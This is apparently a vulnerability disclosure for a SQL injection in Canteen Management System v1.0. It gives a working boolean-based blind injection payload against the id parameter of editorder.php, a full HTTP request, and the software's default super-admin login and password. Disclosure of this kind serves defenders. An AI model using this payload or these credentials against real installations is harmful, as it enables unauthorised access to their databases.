# Canteen Management System v1.0 by mayuri_k has SQL injection

BUG_Author: 庞习铭

vendors: https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

The program is built using the xmapp-php8.1 version

Login account: mayuri.infospace@gmail.com/rootadmin (Super Admin account)

Vulnerability File: /youthappam/editorder.php?id=

Vulnerability location: /youthappam/editorder.php?id=, id

dbname =youthappam,length=10

[+] Payload: /youthappam/editorder.php?id=1%20and%20length(database())%20=10--+ // Leak place ---> id

```sql
GET /youthappam/editorder.php?id=1%20and%20length(database())%20=10--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=lf9hph2449vgrcadcct2jgd8ne
Connection: close
```

length = 10
![image](https://user-images.githubusercontent.com/54017627/195261644-6467f92a-b0f9-4e22-810a-32e661a4672e.png)


length = 9
![image](https://user-images.githubusercontent.com/54017627/195262249-bf94f2ee-1ae0-4199-8e87-f6920b2e5f5d.png)

